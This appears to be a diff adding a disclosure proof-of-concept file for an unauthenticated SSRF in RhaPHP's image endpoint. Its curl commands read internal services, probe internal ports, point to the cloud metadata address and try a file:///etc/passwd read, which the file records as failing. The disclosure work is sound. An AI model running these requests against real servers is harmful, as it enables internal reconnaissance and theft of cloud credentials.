@@ -1,0 +1,30 @@
+RHA-01 PoC — Unauthenticated full-response SSRF in RhaPHP mp/show/image (CWE-918)
+Target: https://github.com/geesondog/rhaphp commit 7ae639c (see TARGET-SOURCE.txt)
+All payloads below are harmless (internal marker service / port probing on a local lab).
+
+--- PoC 1: full response body of an internal URL is echoed back -----------------------------
+# marker service: python3 -m http.server 8899 (or any internal HTTP service)
+curl -s "http://<RHAPHP-HOST>/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php%3Fwx_fmt%3Dpng"
+# => HTTP 200, body = the internal service's FULL response (marker string visible to attacker),
+#    Content-type: image/png (wx_fmt= is attacker-influenced)
+# Apache/Nginx PATH_INFO form of the same endpoint:
+curl -s "http://<RHAPHP-HOST>/mp/show/image?url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php%3Fwx_fmt%3Dpng"
+
+--- PoC 2: no authentication ----------------------------------------------------------------
+curl -s -o /dev/null -H "Cookie: " -w "HTTP %{http_code}\n" \
+  "http://<RHAPHP-HOST>/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php"
+# => HTTP 200 with an EMPTY cookie jar (controller Show has no auth check)
+
+--- PoC 3: internal port oracle --------------------------------------------------------------
+curl -s --max-time 6 -o /dev/null -w "open   HTTP %{http_code} size=%{size_download} time=%{time_total}s\n" \
+  "http://<RHAPHP-HOST>/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php"
+curl -s --max-time 6 -o /dev/null -w "closed HTTP %{http_code} size=%{size_download} time=%{time_total}s\n" \
+  "http://<RHAPHP-HOST>/index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A3307%2F"
+# => open vs closed internal ports distinguishable (body present / instant refusal);
+#    filtered hosts hang for the 30s CURLOPT_CONNECTTIMEOUT
+# Cloud deployments: url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F is reachable the same way.
+
+--- PoC 4: file:// escalation control (NOT possible) ----------------------------------------
+curl -s "http://<RHAPHP-HOST>/index.php?s=/mp/show/image&url=file%3A%2F%2F%2Fetc%2Fpasswd"
+# => "非法协议" (illegal protocol). strpos($url,'http')===0 check runs BEFORE urldecode(),
+#    so no double-encoding bypass to other wrappers. SSRF is http/https-only (verified).
